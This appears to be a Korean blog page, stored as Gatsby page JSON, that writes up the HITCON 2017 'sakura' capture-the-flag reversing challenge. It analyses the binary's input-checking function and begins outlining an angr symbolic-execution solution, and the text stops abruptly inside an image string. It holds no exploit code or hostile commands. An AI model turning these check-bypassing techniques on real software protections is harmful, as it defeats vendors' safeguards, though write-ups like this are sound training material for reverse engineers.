{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/hitcon2017_sakura_ctf_writeup/2020-08-16-HITCON2017-sakura/",
    "result": {"data":{"cur":{"id":"ef8ed1c7-9551-52fe-b73a-9e513ec3f2b6","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-실행-결과\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\" aria-label=\"바이너리 실행 결과 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 실행 결과</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAhklEQVQI14XLWQrCMBQF0CzDr8xzjG3zGjukUKn+uAX3vxCJhf6pcLg87uWh5XZP1wmGeRwmXzYxbwn62PUN5NhBC7lJeZgK5GVcz8/XqTwU15fQAlUOSRepckxXVHuqA9P+w7Ha+z25Dtw44QwzlsjaEGkRFoZI+w0+DmGwsLtjRT8+/3oDcQIlrXimAFsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/6ad0125884e469a9350fa38de0d04d56/37523/0.png\"\n        srcset=\"/static/6ad0125884e469a9350fa38de0d04d56/e9ff0/0.png 180w,\n/static/6ad0125884e469a9350fa38de0d04d56/f21e7/0.png 360w,\n/static/6ad0125884e469a9350fa38de0d04d56/37523/0.png 720w,\n/static/6ad0125884e469a9350fa38de0d04d56/078fe/0.png 934w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>입력 대기중 😑</li>\n</ul>\n<h2 id=\"바이너리-정보\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\" aria-label=\"바이너리 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 정보</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABmUlEQVQozz2SCY7bMAxF5zRtElvWSorU6iWxM3GmmUHn/mcpVBcFPiSA+u+TBPQWx9uyPR1lHyvGiqGdjovGpICl9cqxwRDqwmWxlJSjv0XSGN/StMZ6RU4W2QJp5ynWedt9mpCTAfp5EdLA/vqu13fg5JBNs5GG8BbHW72+H6ZTN/w498rR/voer3eLQSh76sSg4fHr93h7OIrSgFBOGmidQ73mebPI3aAvQp17qYGX+4ejbIAuQp57KQ2u+2dZNufjRahTN/TSNJjLzGUxyBehjgdHaX28DEaL4YhT1t+fX44LUOqGZhPKHjvf8rxaZOeD86GX2iCX+a4hWORzL0/dMGi4f3xN68OHoqw/9/IsVIMhVJ8maf1gcDAolAMu07ZrjEDxbx8ptLu9v9K0YsipzkDR+dBgBe2CUP+L0sRlaUNyNhg1BJ/GedsxVEeZ4khp5Dw32KdpWndL2frURNlRBi5HEMYRQg31uu2fy/Ysy2Z9clSsz//gZfuwPvlYfRzbV+E8GOwVCAW9cp20jvP2bDDl+Zj00B97rIQkL9aa6wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/0c34d274013459e1eb882e5286557a7b/37523/1.png\"\n        srcset=\"/static/0c34d274013459e1eb882e5286557a7b/e9ff0/1.png 180w,\n/static/0c34d274013459e1eb882e5286557a7b/f21e7/1.png 360w,\n/static/0c34d274013459e1eb882e5286557a7b/37523/1.png 720w,\n/static/0c34d274013459e1eb882e5286557a7b/42d54/1.png 858w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABhElEQVQY012Q3Y7SQACFeRATQ+l0/vpf2oXiwiY+gashy64mGvXK+NBGsVigQ1va6bRDZ4OY3cTkXJybL/nOGSRp8eNn+nudJJtsu8+3acoYy/Lqw6evkFiWGyDTMYhlEAsS+1ywCakFsBk4/kBKJWXP+Sk7VE0r+r5vO6GUevj4GRCT+hHApg4JQPS/6IgO6rptW1nXXcaqzY5lBduy9FAVb+7uiRN4QaRDPDLwEMChDjWANIAuBSA6UEp13Wm/r9e/ih0redM0NZen/nZ5PyJOMJv7kziavHL9kNouNh1iudT2ELF0SP7BWcaTTVEeRXWsGMt4I26XK0ht82qKxqEXXlHbexI2/g55hvNcbP6UXLR5LouiUUq9Xa5eEkuLr/E0pp6rGfjirAE0Ms5DnuHdrl4nJSuPRSF4dT7s3er9C02H1ILYhMjUIQaQAEh0Aw9HhgbgGS7LRggp5antOt60lahyfmh68eXb92h2Ey9ej+N5EM/H8eISf3IdxgsnnDrR7BEA4e2j78IetQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/65dd55752bf6d4781d8917b03dc549c7/37523/2.png\"\n        srcset=\"/static/65dd55752bf6d4781d8917b03dc549c7/e9ff0/2.png 180w,\n/static/65dd55752bf6d4781d8917b03dc549c7/f21e7/2.png 360w,\n/static/65dd55752bf6d4781d8917b03dc549c7/37523/2.png 720w,\n/static/65dd55752bf6d4781d8917b03dc549c7/abe2a/2.png 1067w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Python<span class=\"token operator\">></span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>end<span class=\"token operator\">-</span>fisrt<span class=\"token punctuation\">)</span>\n0x18fL\nPython<span class=\"token operator\">></span><span class=\"token number\">0x18f</span>\n<span class=\"token number\">399</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">0x14</code> 번 루틴을 돌면서 <code class=\"language-text\">read</code> 함수를 바탕으로 입력을 받는다. 입력을 받을시 해당 <code class=\"language-text\">unk_212E0</code> 버퍼를 사용하는데 해당 사이즈는 400바이트임을 계산할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4ElEQVQY002Py3LCMAxF8/8fyIIFJEwcAsSuZTmW/FTHTWk5o5U0Z3TvkFISkdakViHKAJxzaR/kXHIuGBEZKRMyppKO06BUut3EmD77np3j1gSAnYvGkFIOIDpHD/NYXsvyWjbYAgf5YbhcolISo3jfnx9oHZyL8wzXq9E6eB+NNkYb+2WZWN4M05RPJ5kmWVc58ovItu2I8X6naYajCCJ675m5lF7qVx7HeD7LPMvz2c23HLQOSoVxxNZaKQUAENFa+2d2Weuyrr2wtf+xvU/7nqytzH1Vaw0hMDMRfcrfNMhaLSDsvMUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/01616dc0e018246951c86e61b13d47c8/1f083/3.png\"\n        srcset=\"/static/01616dc0e018246951c86e61b13d47c8/e9ff0/3.png 180w,\n/static/01616dc0e018246951c86e61b13d47c8/f21e7/3.png 360w,\n/static/01616dc0e018246951c86e61b13d47c8/1f083/3.png 660w\"\n        sizes=\"(max-width: 660px) 100vw, 660px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>루틴을 돌면서 400바이트 입력을 받은후 해당 <code class=\"language-text\">unk_212E0</code> 를 인자로 하여 <code class=\"language-text\">sub_850</code> 함수를 호출한후 해당 반환 값을 0이 아닐경우 FLAG 값을 출력하는 것을 확인할 수 있다.</li>\n<li>출력 중간 사이에 <code class=\"language-text\">sub_10FF6</code> 함수가 보일텐데 해당 함수는</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAo0lEQVQY022PXQ7CMAyDuf/VOAJiEj/apEG0Nt0SJ90aJBA8oH2vtmX7MI4Qidai1gBCpJZimXXdtohYv8Qeh67D9RrM8TEwI0243B9jJvcVUMDMrLW2Ez6fl74P9/io82zM1vcYnpSWIossb8xst9m7Lobh12xE5XY5JqJ5rgaoaLW6vV/8h4nAHNMUOZuqu28qoHQqYHFNkrJmBhcrLf6XvwBZyCK5yBiFegAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/7de64c55e6188ed584d5d9f3c2bce6c8/37523/4.png\"\n        srcset=\"/static/7de64c55e6188ed584d5d9f3c2bce6c8/e9ff0/4.png 180w,\n/static/7de64c55e6188ed584d5d9f3c2bce6c8/f21e7/4.png 360w,\n/static/7de64c55e6188ed584d5d9f3c2bce6c8/37523/4.png 720w,\n/static/7de64c55e6188ed584d5d9f3c2bce6c8/94829/4.png 878w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">SHA256</code>으로 해쉬화 하여 출력을 한다 즉, 해당 함수는 출력을 해쉬화 하는 과정이고 우리가 알아야 할 것은 어떤 걸 해쉬화를 하는지 입력 값을 바탕으로 어떤 조건을 통해 해쉬화 가되어지는지를 알아야 한다.</li>\n</ul>\n<h2 id=\"sub_850-함수-분석\" style=\"position:relative;\"><a href=\"#sub_850-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_850 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_850 함수 분석</h2>\n<p><strong>_start</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6UlEQVQY0y2O3WqDQBhEff/3aVPwrpIqJIEuJDWiGyNha62rQd3V/f/Kas/F3M2cCbIrPR6/TydSFBOloDVY69M5AICumxlTlHIhFQBYa82KtdY5FxwOSRjuwvAFofx8BowdxjBNsNE0bOb6dqfXJm/HJ5uEkEKu+DL6RFG0j6L3NK3KEvrece7lG23LOde3siO0nvi8LFIpqZSSUhpjgq/LJY7jJPnIc4IxVJVrGl/bbvf9zGfd1k87tJwbxowxenvuzUkSv3leESrSFMrSPR4gxL+ZkHEYVJaN9/qH/HbjKKVUy7K4dfsPXgkV0g28KHwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/ca4606e1ae6534fbba55a9b7d14be3ae/37523/5.png\"\n        srcset=\"/static/ca4606e1ae6534fbba55a9b7d14be3ae/e9ff0/5.png 180w,\n/static/ca4606e1ae6534fbba55a9b7d14be3ae/f21e7/5.png 360w,\n/static/ca4606e1ae6534fbba55a9b7d14be3ae/37523/5.png 720w,\n/static/ca4606e1ae6534fbba55a9b7d14be3ae/cab8c/5.png 744w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>_end</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAn0lEQVQI14WLSwrCQBAFs/VCHsKjeMKIQkAvEEGTbSCLMMhkxp6e/6eFaHRp7erxqqrrQ9teGUsA5BwRFaLifUT08+zH0Q6DUWAVKFSYQiq55JxpoWqapuu6ED7uXER0zkXvYynvjYQWXHGBgj2Z1JJWqvNl0/dbYx6LFsQkZeI8T5P/ngABEFCjBKmN/sWn4+5+26ck1zhYm2Ika+kvL2/44wb46ikBAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/fbc803d74f80bf0bbc5b71df1bd25948/37523/6.png\"\n        srcset=\"/static/fbc803d74f80bf0bbc5b71df1bd25948/e9ff0/6.png 180w,\n/static/fbc803d74f80bf0bbc5b71df1bd25948/f21e7/6.png 360w,\n/static/fbc803d74f80bf0bbc5b71df1bd25948/37523/6.png 720w,\n/static/fbc803d74f80bf0bbc5b71df1bd25948/fe9f1/6.png 883w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>무려 시작과 끝의 옵셋 차이가 67493이 가 나는 함수 영역이다. …</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABA0lEQVQY022QjY6DIBCEff8HPGuvtWppq/xY0bKAsuyFq2faXCdkQhY+ZkImJQJQjEREy0LGJNfajaMfhuSI6Sz+6nVDRFlZ4n5PTUN1TfP8HJKUMI5OcPhuWKNrsF5rYy1YawFgWZYVrio8HOhyIaVS5vNRpeBhvOBwOIs9P/X3xzKHGDH+aYWbJjJGQqyxG2zM3HHTMeYm5Rwa411Scu/9W+08J87f4GGwXHjJ5NTrWwvTiDFiCGGLTTBjeDql2kJQCOu0763W7sJcUd2Zvoq7fkYCQNguEWXXK5YlMZbWy4eZVLt97Ooql183JZGQ/inBx+NH2HetKepzIXdtr+In+AdgVcxZZhYFcQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/bb1a74fa4329a40fcf42439525441c82/738b8/7.png\"\n        srcset=\"/static/bb1a74fa4329a40fcf42439525441c82/e9ff0/7.png 180w,\n/static/bb1a74fa4329a40fcf42439525441c82/f21e7/7.png 360w,\n/static/bb1a74fa4329a40fcf42439525441c82/738b8/7.png 639w\"\n        sizes=\"(max-width: 639px) 100vw, 639px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>처음 프롤로그 부분에서 스택 영역을 <code class=\"language-text\">0x1E60</code> 만큼이나 할당해준 후 무수히 많은 변수에 값을 대입하고 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 717px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLElEQVQoz13Q2W7CMBBA0fz/B1IqCjSJspjEJN5nvE3lAmnKPNmWjnzt6nql2436nozJ3kciUgqlRM5tXYt2Huu1doiZckwx5phyotdUTUOIZZXz80hr1LpgxnTOxeDvePTgIKUdPhxoWZ6bh19X4Nz2g+x64X1G9JzzZVmMMTFG2k3VdSQlaU0A+5v9NNm6m7tpltoYo621zrl3DFCYMeRc4twCxJIacwgJIFh0Kwhu78or5dVkJoXqD59OxBiNI21vEQLW1bGbHplC7yG4EGLOKaWUt4954OOxNCPSViQESAnDoL6buwsA4K11xpR6ANiXV19f1LZ0PpN65UiJUgIbzanpP9jnpR+ltIgYYwwh/MN1TcNQ/PZhUsKyOD7bSzvOdhbKrGJ9C37gH/xgCQTUFBitAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/3bd856661e7f77dc51c2cae7c5c0aee2/0ad97/8.png\"\n        srcset=\"/static/3bd856661e7f77dc51c2cae7c5c0aee2/e9ff0/8.png 180w,\n/static/3bd856661e7f77dc51c2cae7c5c0aee2/f21e7/8.png 360w,\n/static/3bd856661e7f77dc51c2cae7c5c0aee2/0ad97/8.png 717w\"\n        sizes=\"(max-width: 717px) 100vw, 717px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>비슷한 구조로 한 블록에서 루프를 돌면서 비교를 한 후에 같지 않을 경우 <code class=\"language-text\">mov [rbp+var_1E49], 0</code> 과정을 하는 패턴이 계속 보이는 것을 확인할 수 있으며,</li>\n<li>같을 경우 <code class=\"language-text\">mov [rbp+var_1E48], 0</code> 패턴을 진행하며 함수의 ret 까지 계속 진행한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 714px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABD0lEQVQY0z2Q224DIQxE9/9/Mfe0SXZhLxhsMGBwlXTb0TxZOjojD/OMiJqzxtidY++5d81ZSmkBOST0kWacDZglLM/tadCUVvST4XbDx0ND6M6pyPtUStu2FEI5Xsxp/Po2NiaiSDFGJJQm+pfB+8isn3bnknOsqsy1lJZSjZxDDpbmLW4QwZId/ciVd/h4LIeDGqPOaWu72RgiKvc7nB6PF0weMYQAAESUOPXed/h6xXFU73uM+5haZV0jYT2f8XL3ryd7F2BzbnOJUpO34ZcfiHaotYaYATjnKtJEeilaq+YqkMCzDxyAARIUKfpxD9b+wz1nSUlqbdNEre3bRKpd7bzNCyzTOk3LVOr+7R+fV5NqikElIwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/8cc51a04cf277bb40fc81c7f5f34179c/d67ca/9.png\"\n        srcset=\"/static/8cc51a04cf277bb40fc81c7f5f34179c/e9ff0/9.png 180w,\n/static/8cc51a04cf277bb40fc81c7f5f34179c/f21e7/9.png 360w,\n/static/8cc51a04cf277bb40fc81c7f5f34179c/d67ca/9.png 714w\"\n        sizes=\"(max-width: 714px) 100vw, 714px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>결과적으로 반환 되는 함수의 값을 확인해 본 결과 마찬가지로 동일한 패턴으로 되는 것을 알 수 있으며 우리는 해당 반환 값이 0이 아니라 입력 한 값을 바탕으로 해당 함수의 로직으로 생신 값이 필요하기에 <code class=\"language-text\">movzx eax, [rbp+var_1E49]</code> 조건으로 점프할 수 있는 조건이 필요하다.</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"solved-code\" style=\"position:relative;\"><a href=\"#solved-code\" aria-label=\"solved code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solved Code</h2>\n<ul>\n<li>해당 문제를 풀기 위해 angr 모듈을 사용할 것이다. <code class=\"language-text\">sub_850</code> 함수의 조건을 명제 논리식으로 판단하기 위해 <code class=\"language-text\">Boolean SATisfiability problem</code> 방식으로 접근해야 한다.</li>\n<li>True가 될 조건은 <code class=\"language-text\">jz</code> 분기로 점프한 <code class=\"language-text\">mov eax, []</code> 부분일 것이고</li>\n<li>False가 될 조건은 <code class=\"language-text\">jz</code> 분기로 점프를 하지 않은 <code class=\"language-text\">mov [rbp+var_1E49], 0</code> 해당 부분이 될 것이다.</li>\n<li>피해해야 할 부분의 False는 아주 고맙게도 같은 <code class=\"language-text\">C6 85 B7 E1 FF FF 00</code> 바이트이며</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: 